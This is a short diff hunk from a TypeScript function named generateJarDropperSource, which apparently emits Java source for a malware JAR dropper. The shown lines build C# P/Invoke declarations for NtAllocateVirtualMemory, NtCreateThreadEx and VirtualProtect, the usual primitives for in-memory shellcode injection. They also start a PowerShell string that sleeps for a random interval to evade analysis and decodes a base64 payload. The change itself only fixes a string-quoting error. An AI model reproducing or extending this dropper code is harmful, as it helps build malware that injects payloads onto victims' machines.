@@ -514,7 +514,7 @@ function generateJarDropperSource(jarPersist: boolean): string {
     "    String td=\"using System;using System.Runtime.InteropServices;public class N{\"",
     "      +\"[DllImport(\"+dq+ntd+dq+\")]public static extern int NtAllocateVirtualMemory(IntPtr h,ref IntPtr a,IntPtr z,ref IntPtr s,uint t,uint p);\"",
     "      +\"[DllImport(\"+dq+ntd+dq+\")]public static extern int NtCreateThreadEx(ref IntPtr t,uint a,IntPtr o,IntPtr p,IntPtr e,IntPtr u,bool c,uint k,uint f,uint x,IntPtr q);\"",
-    "      +\"[DllImport(\"+dq+k32+dq+\")]public static extern bool VirtualProtect(IntPtr a,uint s,uint p,ref uint o);}\";\";",
+    "      +\"[DllImport(\"+dq+k32+dq+\")]public static extern bool VirtualProtect(IntPtr a,uint s,uint p,ref uint o);}\";"  ,
     "    String ps=",
     "      \"Start-Sleep -Milliseconds (Get-Random -Minimum 1000 -Maximum 3000);\"",
     "      +\"$b=[Convert]::FromBase64String('\"+b64+\"');\"",
